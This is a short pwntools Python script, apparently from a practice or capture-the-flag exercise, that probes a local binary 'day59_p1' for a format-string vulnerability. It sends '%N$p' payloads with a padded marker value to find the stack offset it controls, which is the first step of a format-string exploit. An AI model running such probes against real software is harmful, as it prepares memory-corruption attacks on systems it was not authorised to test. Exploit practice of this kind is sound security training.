from pwn import *

context.binary = "./day59_p1"
context.log_level = "error"

marker = 0xdeadbeefcafebabe

for i in range(1, 80):
    p = process("./day59_p1")

    payload  = f"%{i}$p.END".encode()
    payload  = payload.ljust(40, b"A")
    payload += p64(marker)

    p.recvuntil(b"report:")
    p.sendline(payload)

    out = p.recvall(timeout=0.3)

    if b"deadbeefcafebabe" in out:
        print("[+] controlled argument offset =", i)
        print(out)

    p.close()
